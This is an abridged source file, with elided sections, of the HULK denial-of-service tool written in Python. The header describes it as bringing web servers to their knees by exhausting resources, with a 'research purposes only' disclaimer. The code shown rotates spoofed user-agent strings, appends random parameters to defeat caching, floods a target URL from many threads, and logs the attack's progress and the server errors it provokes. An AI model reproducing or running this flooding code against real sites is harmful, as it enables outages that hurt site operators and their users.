...
# order to bring them to their knees by exhausting the resource pool, its is
# meant for research purposes only and any malicious usage of this tool is
# prohibited.
#
...
def useragent_list():
    ...
    headers_useragents.append(
        ...
        'AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; '
        'WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; '
        'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET '
...
def http_call(call_url):
    ...
    if call_url.count("?") > 0:
        ...
        param_joiner = "?"
    request = urllib2.Request(call_url + param_joiner + build_block(
        random.randint(3, 10)) + '=' + build_block(random.randint(3, 10)))
    ...
    try:
        ...
        # print e.code
        set_flag(1)
        logger.error('Response Code 500 - %s', e)
        code = 500
...
class HTTPThread(threading.Thread):
    def run(self):
        try:
            ...
            logger.warn('Unexpected exception %s', e)
    ...
    def run(self):
        ...
        while flag == 0:
            if (previous + 100 < request_counter) & (
                    previous != request_counter):
                logger.info("%d Requests Sent", request_counter)
                previous = request_counter
        if flag == 2:
            logger.info("HULK Attack Finished")
...
if len(sys.argv) < 2:
    ...
    if sys.argv[1] == "help":
        ...
        logger.info("HULK Attack Started")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
